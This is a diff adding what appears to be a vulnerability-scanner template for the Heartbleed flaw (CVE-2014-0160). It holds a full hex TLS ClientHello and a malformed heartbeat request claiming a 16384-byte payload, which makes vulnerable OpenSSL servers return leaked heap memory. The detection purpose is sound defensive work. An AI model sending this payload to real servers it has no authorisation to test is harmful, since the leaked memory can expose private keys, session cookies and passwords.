@@ -1,0 +1,20 @@
+id: openssl/heartbleed-mem-leak
+summary: CVE-2014-0160 Heartbleed: a vulnerable TLS server leaks memory from its heap.
+ref: CVE-2014-0160
+
+tls clienthello-heartbeat
+  # Send the TLS 1.2 ClientHello advertising the heartbeat extension (type 0x000f), then wait for the ServerHelloDone handshake message (type 0x0e, length 0) before proceeding.
+  send hex "1603030125010001210303dc04d1360e51424a30521ab5ed9193c0c196b4f0c0baefe166ee0b6bb1037d92208d69ee09dee48f89704c4b392fd37ff121488342760d942f1ecf77a40e013afd003e130213031301c02cc030009fcca9cca8ccaac02bc02f009ec024c028006bc023c0270067c00ac0140039c009c0130033009d009c003d003c0035002f00ff0100009a000b000403000102000a000c000a001d0017001e00190018002300000016000000170000000d0030002e040305030603080708080809080a080b080408050806040105010601030302030301020103020202040205020602002b0009080304030303020301002d00020101003300260024001d00201c5a1b918716753038aa6924686baf8c318640a62ccacfcead4b95dcea1af905000f000101"
+  receive until "0e000000"
+  receive 65536 bytes
+  timeout 5 seconds
+  expect "0e000000" in the response
+  # ServerHelloDone arrived: the peer speaks TLS and reached the point where the client sends its next message
+
+tls malformed-heartbeat
+  # Send a heartbeat request claiming payload_length 0x4000 (16384) with zero payload bytes. A vulnerable server trusts the length and echoes a heartbeat response record (type 0x18) carrying leaked memory.
+  send hex "1803030003014000"
+  receive 70000 bytes
+  timeout 5 seconds
+  expect the response to match "18030[123]40"
+  # a heartbeat response record (type 0x18) arrived: the server echoed the claimed 16384-byte payload, which is the leaked memory
